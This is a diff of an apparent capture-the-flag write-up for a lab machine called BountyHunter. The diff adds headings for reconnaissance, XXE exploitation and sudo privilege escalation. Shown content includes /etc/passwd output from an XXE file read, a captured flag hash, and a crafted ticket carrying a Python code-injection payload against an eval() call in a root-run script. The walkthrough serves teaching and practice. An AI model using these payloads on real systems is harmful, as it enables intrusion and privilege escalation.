@@ -21,6 +21,8 @@ layout:
 
 ***
 
+## Reconnaissance
+
 
 
 ```bash
@@ -104,6 +106,8 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 
 <figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+## Web Enumeration
 
 
 
@@ -205,7 +209,9 @@ log\_submit.php
 
 <figure><img src="../../.gitbook/assets/5314_vmware_NNQK0l7EVG.png" alt=""><figcaption></figcaption></figure>
 
+## Initial Access
 
+### XXE (XML External Entity Injection) Exploitation
 
 <figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>
 
@@ -254,6 +260,8 @@ log\_submit.php
 
 
 <figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>
+
+### XXE PHP File Read - Base64 Wrapper
 
 
 
@@ -309,6 +317,10 @@ development:x:1000:1000:Development:/home/development:/bin/bash
 lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 ```
+
+
+
+### Python Script to perform XXE Base 64 Wrapper Exploitation
 
 
 
@@ -428,6 +440,8 @@ if __name__ == "__main__":
 
 
 
+
+
 ```bash
 ❯ python3 xxe_lfi.py /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -513,6 +527,10 @@ development@bountyhunter:~$ cat user.txt
 f07029dc46d723633872107f9907e02f
 ```
 
+## Privilege Escalation
+
+### Abusing sudoers privilege
+
 
 
 ```bash
@@ -522,6 +540,25 @@ Matching Defaults entries for development on bountyhunter:
 
 User development may run the following commands on bountyhunter:
     (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+```
+
+
+
+```bash
+development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ ls -l
+total 16
+-r--r--r-- 1 root root 102 Jul 22  2021 390681613.md
+-r--r--r-- 1 root root  86 Jul 22  2021 529582686.md
+-r--r--r-- 1 root root  97 Jul 22  2021 600939065.md
+-r--r--r-- 1 root root 101 Jul 22  2021 734485704.md
+
+development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md 
+# Skytrain Inc
+## Ticket to New Haven
+__Ticket Code:__
+**31+410+86**
+##Issued: 2021/04/06
+#End Ticket
 ```
 
 
@@ -585,22 +622,28 @@ main()
 
 
 
-```bash
-development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ ls -l
-total 16
--r--r--r-- 1 root root 102 Jul 22  2021 390681613.md
--r--r--r-- 1 root root  86 Jul 22  2021 529582686.md
--r--r--r-- 1 root root  97 Jul 22  2021 600939065.md
--r--r--r-- 1 root root 101 Jul 22  2021 734485704.md
+```python
+validationNumber = eval(x.replace("**", ""))
+```
 
-development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md 
+
+
+```markdown
 # Skytrain Inc
-## Ticket to New Haven
+## Ticket to Exploitville
 __Ticket Code:__
-**31+410+86**
-##Issued: 2021/04/06
+**4+__import__('os').system('id')**
+##Issued: 2025/03/03
 #End Ticket
 ```
+
+
+
+```python
+validationNumber = eval("4+__import__('os').system('id')")
+```
+
+
 
 
 
